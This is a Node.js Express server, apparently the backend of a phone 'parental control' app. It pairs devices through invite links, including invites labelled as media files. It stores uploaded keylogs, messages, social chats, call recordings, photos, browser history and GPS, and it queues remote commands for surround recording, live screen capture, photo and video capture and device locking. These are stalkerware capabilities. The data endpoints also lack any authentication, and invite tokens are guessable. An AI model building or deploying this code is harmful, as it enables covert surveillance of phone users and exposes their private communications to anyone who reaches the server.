import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { fileURLToPath } from "node:url";
import {
  processGeofenceForLocation,
  scanForKeywords,
  rescanStoredDataForKeywords
} from "./syncHelpers.js";
import {
  resolveUploadDeviceId,
  resolveQueryDeviceId,
  filterByDevice,
  clearAllDeviceStores,
  getRemoteControlForDevice,
  defaultRemoteControlState
} from "./deviceHelpers.js";
import { loadPersistedState, savePersistedState } from "./stateStore.js";

dotenv.config();

/** Empty payloads when no child device is paired — parent UI shows bind prompts, not fake data. */
const emptyOverviewStats = [
  { label: "Calls", value: 0, change: "—" },
  { label: "Messages", value: 0, change: "—" },
  { label: "Locations", value: 0, change: "—" },
  { label: "Alerts", value: 0, change: "—" }
];

const emptyDashboard = {
  overviewStats: emptyOverviewStats,
  callLogs: [],
  messages: [],
  locations: [],
  socialChats: [],
  appCalls: [],
  contacts: [],
  usageStats: [],
  installedApps: [],
  notifications: [],
  browserHistory: [],
  wifiLogs: [],
  safetyAlerts: [],
  photos: [],
  keylogs: [],
  calendarEvents: [],
  geofenceEvents: [],
  keywordAlerts: [],
  geofences: []
};

const app = express();
const port = Number(process.env.PORT) || 8080;
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const distPath = path.resolve(__dirname, "../dist");
const indexPath = path.join(distPath, "index.html");

const corsOrigins = process.env.CORS_ORIGIN
  ? process.env.CORS_ORIGIN.split(",").map((value) => value.trim())
  : [
      "http://localhost:5173", "http://127.0.0.1:5173",
      "http://localhost:5174", "http://127.0.0.1:5174",
      "http://localhost:5175", "http://127.0.0.1:5175",
      "http://localhost:5176", "http://127.0.0.1:5176",
      "http://localhost:5177", "http://127.0.0.1:5177",
    ];

// Active pairing stores
const deviceInvites = new Map();
const boundDevices = [];

// Separate REAL database arrays populated by paired phone simulator
const realLocations = [];
const realCallLogs = [];
const realMessages = [];
const realSocialChats = [];
const realContacts = [];
const realUsageStats = [];
const realInstalledApps = [];
const realNotifications = [];
const realBrowserHistory = [];
const realWifiLogs = [];
const realSafetyAlerts = [];
const realPhotos = [];
const realKeylogs = [];
const realAppCalls = [];
const realCalendarEvents = [];
const realGeofenceEvents = [];
const realKeywordAlerts = [];
const realCallRecordings = [];

/** Parent-defined geofences — updated when child GPS is received. */
const geofences = [
  { id: "home", name: "Home", lat: 39.9526, lng: -75.1652, radiusM: 250, enabled: true },
  { id: "school", name: "School", lat: 39.9612, lng: -75.1498, radiusM: 350, enabled: true }
];
const geofenceStateByDevice = {};

/** Keywords to flag in SMS, chats, notifications, browser, keylogs. */
let trackedKeywords = [
  "robux", "hack", "drink", "hurt", "party", "secret", "password", "cheat"
];

/** Per-device remote control (parent commands → child poll). */
const remoteControlByDevice = new Map();

function uploadDeviceId(req, res) {
  const deviceId = resolveUploadDeviceId(req, boundDevices);
  if (!deviceId) {
    res.status(401).json({ error: "Missing or invalid X-Device-Id header" });
    return null;
  }
  return deviceId;
}

function queryDeviceId(req, res) {
  const deviceId = resolveQueryDeviceId(req, boundDevices);
  if (!deviceId) return null;
  return deviceId;
}

function forDevice(arr, deviceId) {
  return filterByDevice(arr, deviceId, boundDevices.length);
}

const allDataStores = () => ({
  realLocations,
  realCallLogs,
  realMessages,
  realSocialChats,
  realAppCalls,
  realContacts,
  realUsageStats,
  realInstalledApps,
  realNotifications,
  realBrowserHistory,
  realWifiLogs,
  realSafetyAlerts,
  realPhotos,
  realKeylogs,
  realCalendarEvents,
  realGeofenceEvents,
  realKeywordAlerts,
  realCallRecordings
});

function getLocalIp() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const net of interfaces[name]) {
      if (net.family === "IPv4" && !net.internal) {
        return net.address;
      }
    }
  }
  return "localhost";
}

function createInviteToken() {
  return Math.random().toString(36).slice(2, 12);
}

function getAppBaseUrl() {
  if (process.env.APP_BASE_URL) {
    return process.env.APP_BASE_URL.replace(/\/+$/, "");
  }
  if (process.env.VERCEL_URL) {
    return `https://${process.env.VERCEL_URL}`;
  }
  const localIp = getLocalIp();
  return `http://${localIp}:${port}`;
}

function buildInviteUrl(token) {
  return `${getAppBaseUrl()}/bind/${token}`;
}

const stateStores = () => ({
  deviceInvites,
  boundDevices,
  remoteControlByDevice,
  geofenceStateByDevice,
  geofences,
  trackedKeywords,
  realLocations,
  realCallLogs,
  realMessages,
  realSocialChats,
  realContacts,
  realUsageStats,
  realInstalledApps,
  realNotifications,
  realBrowserHistory,
  realWifiLogs,
  realSafetyAlerts,
  realPhotos,
  realKeylogs,
  realAppCalls,
  realCalendarEvents,
  realGeofenceEvents,
  realKeywordAlerts,
  realCallRecordings
});

function persistState() {
  savePersistedState(stateStores());
}

app.use(
  cors({
    origin: (origin, callback) => {
      if (
        !origin ||
        corsOrigins.includes(origin) ||
        origin.includes("localhost") ||
        origin.includes("127.0.0.1") ||
        origin.endsWith(".vercel.app") ||
        origin.startsWith("http://192.168.") ||
        origin.startsWith("http://10.") ||
        origin.startsWith("http://172.")
      ) {
        callback(null, true);
        return;
      }
      callback(new Error("CORS: Origin is not allowed"));
    }
  })
);

loadPersistedState(stateStores());

if (process.env.VERCEL) {
  app.use((req, res, next) => {
    loadPersistedState(stateStores());
    res.on("finish", () => persistState());
    next();
  });
}

app.use(express.json({ limit: "50mb" })); // allow screenshot base64 uploads

app.get("/health", (_req, res) => {
  res.json({ status: "ok", service: "parental-control-backend", localIp: getLocalIp() });
});

// ─── GET API ENDPOINTS WITH PAIRED DEVICE DUMMY HIDE LOGIC ──────────────────
app.get("/api/devices", (_req, res) => {
  res.json(boundDevices);
});

app.get("/api/overview-stats", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  if (!deviceId) {
    res.json(emptyOverviewStats);
    return;
  }
  res.json([
    { label: "Calls", value: forDevice(realCallLogs, deviceId).length, change: "+100%" },
    { label: "Messages", value: forDevice(realMessages, deviceId).length, change: "+100%" },
    { label: "Locations", value: forDevice(realLocations, deviceId).length, change: "+100%" },
    { label: "Alerts", value: forDevice(realSafetyAlerts, deviceId).length, change: "+100%" }
  ]);
});

app.get("/api/call-logs", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realCallLogs, deviceId) : []);
});

app.get("/api/messages", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realMessages, deviceId) : []);
});

app.get("/api/locations", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realLocations, deviceId) : []);
});

app.get("/api/social-chats", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realSocialChats, deviceId) : []);
});

app.get("/api/app-calls", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realAppCalls, deviceId) : []);
});

app.get("/api/contacts", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realContacts, deviceId) : []);
});

app.get("/api/usage-stats", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realUsageStats, deviceId) : []);
});

app.get("/api/installed-apps", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realInstalledApps, deviceId) : []);
});

app.get("/api/notifications", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realNotifications, deviceId) : []);
});

app.get("/api/browser-history", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realBrowserHistory, deviceId) : []);
});

app.get("/api/wifi-logs", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realWifiLogs, deviceId) : []);
});

app.get("/api/safety-alerts", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realSafetyAlerts, deviceId) : []);
});

app.get("/api/photos", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  if (!deviceId) {
    res.json([]);
    return;
  }
  const typeFilter = typeof req.query.type === "string" ? req.query.type : null;
  let list = forDevice(realPhotos, deviceId);
  if (typeFilter) list = list.filter((p) => p.type === typeFilter);
  res.json(list);
});

app.get("/api/keylogs", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realKeylogs, deviceId) : []);
});

app.get("/api/calendar-events", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realCalendarEvents, deviceId) : []);
});

app.get("/api/geofence-events", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realGeofenceEvents, deviceId) : []);
});

app.get("/api/geofences", (_req, res) => {
  res.json(geofences);
});

app.post("/api/geofences", (req, res) => {
  const { name, lat, lng, radiusM, enabled } = req.body;
  if (!name || typeof lat !== "number" || typeof lng !== "number") {
    res.status(400).json({ error: "name, lat, lng are required" });
    return;
  }
  const fence = {
    id: `f${geofences.length + 1}`,
    name: String(name).trim(),
    lat,
    lng,
    radiusM: typeof radiusM === "number" ? radiusM : 250,
    enabled: enabled !== false
  };
  geofences.push(fence);
  res.status(201).json(fence);
});

app.get("/api/keyword-alerts", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realKeywordAlerts, deviceId) : []);
});

app.get("/api/tracked-keywords", (_req, res) => {
  res.json({ keywords: trackedKeywords });
});

app.post("/api/tracked-keywords", (req, res) => {
  const list = req.body?.keywords;
  if (!Array.isArray(list)) {
    res.status(400).json({ error: "keywords array required" });
    return;
  }
  trackedKeywords = list.map((k) => String(k).trim().toLowerCase()).filter(Boolean);
  const deviceId = queryDeviceId(req, res);
  if (deviceId) {
    rescanStoredDataForKeywords(trackedKeywords, {
      realMessages: forDevice(realMessages, deviceId),
      realSocialChats: forDevice(realSocialChats, deviceId),
      realNotifications: forDevice(realNotifications, deviceId),
      realBrowserHistory: forDevice(realBrowserHistory, deviceId),
      realKeylogs: forDevice(realKeylogs, deviceId),
      realKeywordAlerts: forDevice(realKeywordAlerts, deviceId)
    }, deviceId);
  }
  res.json({ keywords: trackedKeywords });
});

app.get("/api/call-recordings", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  res.json(deviceId ? forDevice(realCallRecordings, deviceId) : []);
});

app.post("/api/call-recordings", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { name, phone, type, duration, audioUrl, hasAudio } = req.body;
  const entry = {
    id: realCallRecordings.length + 1,
    deviceId,
    name: name || "Unknown",
    phone: phone || "—",
    type: type || "Incoming",
    duration: duration || "00:00",
    audioUrl: audioUrl || null,
    hasAudio: Boolean(hasAudio && audioUrl),
    time: new Date().toISOString()
  };
  realCallRecordings.unshift(entry);
  res.status(201).json(entry);
});

app.get("/api/dashboard", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  if (!deviceId) {
    res.json(emptyDashboard);
    return;
  }
  res.json({
    overviewStats: [
      { label: "Calls", value: forDevice(realCallLogs, deviceId).length, change: "+100%" },
      { label: "Messages", value: forDevice(realMessages, deviceId).length, change: "+100%" },
      { label: "Locations", value: forDevice(realLocations, deviceId).length, change: "+100%" },
      { label: "Alerts", value: forDevice(realSafetyAlerts, deviceId).length, change: "+100%" }
    ],
    callLogs: forDevice(realCallLogs, deviceId),
    messages: forDevice(realMessages, deviceId),
    locations: forDevice(realLocations, deviceId),
    socialChats: forDevice(realSocialChats, deviceId),
    appCalls: forDevice(realAppCalls, deviceId),
    contacts: forDevice(realContacts, deviceId),
    usageStats: forDevice(realUsageStats, deviceId),
    installedApps: forDevice(realInstalledApps, deviceId),
    notifications: forDevice(realNotifications, deviceId),
    browserHistory: forDevice(realBrowserHistory, deviceId),
    wifiLogs: forDevice(realWifiLogs, deviceId),
    safetyAlerts: forDevice(realSafetyAlerts, deviceId),
    photos: forDevice(realPhotos, deviceId),
    keylogs: forDevice(realKeylogs, deviceId),
    calendarEvents: forDevice(realCalendarEvents, deviceId),
    geofenceEvents: forDevice(realGeofenceEvents, deviceId),
    keywordAlerts: forDevice(realKeywordAlerts, deviceId),
    geofences
  });
});

// ─── POST API ENDPOINTS TO RECEIVE REAL DEVICE TELEMETRY ──────────────────

app.post("/api/battery", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { level } = req.body;
  if (typeof level === "number") {
    const dev = boundDevices.find((d) => d.id === deviceId);
    if (dev) dev.battery = level;
  }
  res.status(201).json({ success: true });
});

app.post("/api/locations", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { lat, lng, place } = req.body;
  if (typeof lat !== "number" || typeof lng !== "number") {
    res.status(400).json({ error: "lat and lng numbers are required" });
    return;
  }
  if (!geofenceStateByDevice[deviceId]) geofenceStateByDevice[deviceId] = {};
  const newLocation = {
    id: realLocations.length + 1,
    deviceId,
    lat,
    lng,
    place: place || "Simulated Location",
    time: new Date().toISOString()
  };
  realLocations.unshift(newLocation);
  processGeofenceForLocation(
    lat,
    lng,
    geofences,
    geofenceStateByDevice[deviceId],
    realGeofenceEvents,
    realSafetyAlerts,
    deviceId
  );
  res.status(201).json(newLocation);
});

app.post("/api/call-logs", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { contact, number, type, duration } = req.body;
  const newCall = {
    id: realCallLogs.length + 1,
    deviceId,
    contact: contact || "Unknown",
    number: number || "+1-555-0000",
    type: type || "Incoming",
    duration: duration || "01:30",
    time: new Date().toISOString()
  };
  realCallLogs.unshift(newCall);
  res.status(201).json(newCall);
});

app.post("/api/messages", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { from, channel, preview } = req.body;
  const newMessage = {
    id: realMessages.length + 1,
    deviceId,
    from: from || "Sender",
    channel: channel || "SMS",
    preview: preview || "Hello",
    time: new Date().toISOString()
  };
  realMessages.unshift(newMessage);
  scanForKeywords(
    `${preview || ""} ${from || ""}`,
    channel || "SMS",
    trackedKeywords,
    realKeywordAlerts,
    deviceId
  );
  res.status(201).json(newMessage);
});

app.post("/api/social-chats", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { app: appName, contact, preview, fullText, messageType, mediaUrl } = req.body;
  const newChat = {
    id: realSocialChats.length + 1,
    deviceId,
    app: appName || "WhatsApp",
    contact: contact || "Contact",
    preview: preview || "Hey there",
    fullText: fullText || preview || "",
    messageType: messageType || "text",
    mediaUrl: mediaUrl || null,
    time: new Date().toISOString()
  };
  realSocialChats.unshift(newChat);
  scanForKeywords(
    `${preview || ""} ${contact || ""}`,
    appName || "Social",
    trackedKeywords,
    realKeywordAlerts,
    deviceId
  );
  res.status(201).json(newChat);
});

app.post("/api/app-calls", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { name, phone, app: appName, type, duration, status } = req.body;
  const now = new Date().toISOString();
  const newCall = {
    id: String(realAppCalls.length + 1),
    deviceId,
    name: name || "Unknown",
    phone: phone || "—",
    app: appName || phone || "App",
    type: type || "Incoming",
    startTime: now.replace("T", " ").substring(0, 19),
    duration: duration || "00:00",
    status: status || "Normal",
    time: now
  };
  realAppCalls.unshift(newCall);
  res.status(201).json(newCall);
});

app.post("/api/contacts", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { name, phone, mail, address, blocked } = req.body;
  const newContact = {
    id: String(realContacts.length + 1),
    deviceId,
    name: name || "New Contact",
    phone: phone || "+1-555-0100",
    mail: mail || "",
    address: address || "",
    blocked: blocked === true
  };
  realContacts.unshift(newContact);
  res.status(201).json(newContact);
});

app.post("/api/usage-stats", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { app: appName, duration, icon, color } = req.body;
  const newStat = {
    deviceId,
    app: appName || "YouTube",
    duration: duration || "0h 30m",
    icon: icon || "Y",
    color: color || "#FF0000"
  };
  realUsageStats.unshift(newStat);
  res.status(201).json(newStat);
});

app.post("/api/installed-apps", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { name, packageName, size, isBlocked } = req.body;
  const newApp = {
    deviceId,
    name: name || "App",
    packageName: packageName || "com.app",
    size: size || "45 MB",
    isBlocked: isBlocked === true
  };
  realInstalledApps.unshift(newApp);
  res.status(201).json(newApp);
});

app.post("/api/installed-apps/toggle-block", (req, res) => {
  const deviceId = queryDeviceId(req, res) || req.body?.deviceId;
  const { packageName } = req.body;
  if (!packageName || !deviceId) {
    res.status(400).json({ error: "packageName and deviceId are required" });
    return;
  }
  const list = forDevice(realInstalledApps, deviceId);
  const appItem = list.find((a) => a.packageName === packageName);
  const remoteControlState = getRemoteControlForDevice(remoteControlByDevice, deviceId);
  if (appItem) {
    appItem.isBlocked = !appItem.isBlocked;
    if (appItem.isBlocked) {
      if (!remoteControlState.blockedApps.includes(packageName)) {
        remoteControlState.blockedApps.push(packageName);
      }
    } else {
      remoteControlState.blockedApps = remoteControlState.blockedApps.filter((p) => p !== packageName);
    }
    res.json({ success: true, app: appItem, remoteControlState });
  } else {
    res.status(404).json({ error: "App not found" });
  }
});

app.post("/api/notifications", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { app: appName, title, preview } = req.body;
  const newNotif = {
    id: realNotifications.length + 1,
    deviceId,
    app: appName || "System",
    title: title || "Notification",
    preview: preview || "Notification details",
    time: new Date().toISOString()
  };
  realNotifications.unshift(newNotif);
  scanForKeywords(`${preview || ""} ${title || ""}`, appName || "Notification", trackedKeywords, realKeywordAlerts, deviceId);
  res.status(201).json(newNotif);
});

app.post("/api/browser-history", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { query, url } = req.body;
  const newSearch = {
    id: realBrowserHistory.length + 1,
    deviceId,
    query: query || "search query",
    url: url || "https://google.com",
    time: new Date().toISOString()
  };
  realBrowserHistory.unshift(newSearch);
  scanForKeywords(`${query || ""} ${url || ""}`, "Browser", trackedKeywords, realKeywordAlerts, deviceId);
  res.status(201).json(newSearch);
});

app.post("/api/wifi-logs", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { ssid, status, signal } = req.body;
  const newWifi = {
    id: realWifiLogs.length + 1,
    deviceId,
    ssid: ssid || "HomeNetwork",
    status: status || "Connected",
    signal: signal || "Strong",
    time: new Date().toISOString()
  };
  realWifiLogs.unshift(newWifi);
  res.status(201).json(newWifi);
});

app.post("/api/safety-alerts", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { type, severity, msg } = req.body;
  const newAlert = {
    id: realSafetyAlerts.length + 1,
    deviceId,
    type: type || "System",
    severity: severity || "Info",
    msg: msg || "Alert triggered",
    time: new Date().toISOString()
  };
  realSafetyAlerts.unshift(newAlert);
  res.status(201).json(newAlert);
});

app.post("/api/photos", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { url, title, type } = req.body;
  const newPhoto = {
    id: realPhotos.length + 1,
    deviceId,
    url: url || "https://via.placeholder.com/300",
    title: title || "Screenshot Capture",
    type: type || "gallery",
    time: new Date().toISOString()
  };
  realPhotos.unshift(newPhoto);
  res.status(201).json(newPhoto);
});

app.post("/api/keylogs", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { app: appName, text } = req.body;
  const newKeylog = {
    deviceId,
    app: appName || "Keyboard",
    text: text || "typed input",
    time: new Date().toISOString()
  };
  realKeylogs.unshift(newKeylog);
  scanForKeywords(text || "", appName || "Keyboard", trackedKeywords, realKeywordAlerts, deviceId);
  res.status(201).json(newKeylog);
});

app.post("/api/calendar-events", (req, res) => {
  const deviceId = uploadDeviceId(req, res);
  if (!deviceId) return;
  const { event, startTime, endTime, location, notes } = req.body;
  const entry = {
    id: realCalendarEvents.length + 1,
    deviceId,
    event: event || "Calendar event",
    startTime: startTime || new Date().toISOString().replace("T", " ").slice(0, 19),
    endTime: endTime || "",
    location: location || "",
    notes: notes || "",
    time: new Date().toISOString()
  };
  realCalendarEvents.unshift(entry);
  res.status(201).json(entry);
});

// ─── REMOTE CONTROL REST ENDPOINTS ──────────────────────────────────────────
app.get("/api/remote-control", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  if (!deviceId) {
    res.json(defaultRemoteControlState());
    return;
  }
  res.json(getRemoteControlForDevice(remoteControlByDevice, deviceId));
});

app.post("/api/remote-control", (req, res) => {
  const deviceId = queryDeviceId(req, res) || resolveUploadDeviceId(req, boundDevices);
  if (!deviceId) {
    res.status(400).json({ error: "deviceId query or X-Device-Id required" });
    return;
  }
  const body = req.body ?? {};
  const state = getRemoteControlForDevice(remoteControlByDevice, deviceId);
  const keys = [
    "screenTimeLimit",
    "isDeviceLocked",
    "blockedApps",
    "screenshotPending",
    "surroundRecordPending",
    "recordScreenPending",
    "liveScreenPending",
    "takePhotoPending",
    "recordVideoPending",
    "gallerySyncPending",
    "historicalSyncPending"
  ];
  for (const key of keys) {
    if (body[key] !== undefined) state[key] = body[key];
  }
  res.json(state);
});

app.post("/api/remote-control/reset-data", (req, res) => {
  const deviceId = queryDeviceId(req, res);
  if (!deviceId) {
    res.status(400).json({ error: "deviceId query required" });
    return;
  }
  const removed = clearAllDeviceStores(
    allDataStores(),
    deviceId,
    remoteControlByDevice,
    geofenceStateByDevice
  );
  res.json({ success: true, message: `Cleared ${removed} records for device ${deviceId}.` });
});

// ─── DEVICE PAIRING LIFECYCLE ───────────────────────────────────────────────
app.post("/api/device-invitations", (req, res) => {
  const label = typeof req.body?.label === "string" ? req.body.label.trim() : "";
  const token = createInviteToken();
  const invitation = {
    token,
    label: label || "Child device invite",
    type: "link",
    createdAt: new Date().toISOString(),
    redeemed: false
  };
  deviceInvites.set(token, invitation);
  persistState();
  res.status(201).json({
    ...invitation,
    inviteUrl: buildInviteUrl(token)
  });
});

app.post("/api/device-media-invitations", (req, res) => {
  const fileName = typeof req.body?.fileName === "string" ? req.body.fileName.trim() : "";
  if (!fileName) {
    res.status(400).json({ error: "fileName is required" });
    return;
  }
  const token = createInviteToken();
  const invitation = {
    token,
    label: fileName,
    type: "media",
    createdAt: new Date().toISOString(),
    redeemed: false
  };
  deviceInvites.set(token, invitation);
  persistState();
  res.status(201).json({
    ...invitation,
    inviteUrl: buildInviteUrl(token)
  });
});

app.post("/api/device-invitations/:token/redeem", (req, res) => {
  const { token } = req.params;
  const invite = deviceInvites.get(token);
  if (!invite) {
    res.status(404).json({ error: "Invitation token not found" });
    return;
  }
  if (invite.redeemed) {
    res.status(409).json({ error: "Invitation already redeemed" });
    return;
  }
  const consent = req.body?.consent === true;
  if (!consent) {
    res.status(400).json({ error: "Explicit consent is required to bind device" });
    return;
  }
  const deviceName = typeof req.body?.deviceName === "string" && req.body.deviceName.trim()
    ? req.body.deviceName.trim()
    : "Child Device";
  const boundDevice = {
    id: token,
    deviceName,
    source: invite.type,
    boundAt: new Date().toISOString(),
    battery: 100 // default battery until heartbeat syncs it
  };
  invite.redeemed = true;
  boundDevices.push(boundDevice);
  remoteControlByDevice.set(token, defaultRemoteControlState());
  geofenceStateByDevice[token] = {};
  persistState();
  res.json({ success: true, device: boundDevice });
});

// ─── REMOVE / UNBIND A DEVICE ────────────────────────────────────────────────
app.delete("/api/devices/:id", (req, res) => {
  const { id } = req.params;
  const idx = boundDevices.findIndex(d => d.id === id);
  if (idx === -1) {
    res.status(404).json({ error: "Device not found" });
    return;
  }
  boundDevices.splice(idx, 1);
  const removed = clearAllDeviceStores(
    allDataStores(),
    id,
    remoteControlByDevice,
    geofenceStateByDevice
  );
  console.log(`Device ${id} removed; cleared ${removed} telemetry records.`);
  persistState();
  res.json({ success: true, removed });
});

if (!process.env.VERCEL) {
  app.use(express.static(distPath));
}
app.use((req, res, next) => {
  if (req.path.startsWith("/api/") || req.path === "/health") {
    next();
    return;
  }

  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
    return;
  }

  next();
});

app.use((req, res) => {
  res.status(404).json({ error: `Route not found: ${req.method} ${req.originalUrl}` });
});

app.use((err, _req, res, _next) => {
  const message = err instanceof Error ? err.message : "Internal server error";
  res.status(500).json({ error: message });
});

export { app };

if (!process.env.VERCEL) {
  const httpServer = app.listen(port, () => {
    const mode = process.env.NODE_ENV || "development";
    const staticStatus = fs.existsSync(distPath) ? "enabled" : "missing dist/";
    console.log(`Backend server running at http://localhost:${port} (${mode}, static: ${staticStatus})`);
  });

  httpServer.on("close", () => {
    console.log("Backend server closed");
  });
}
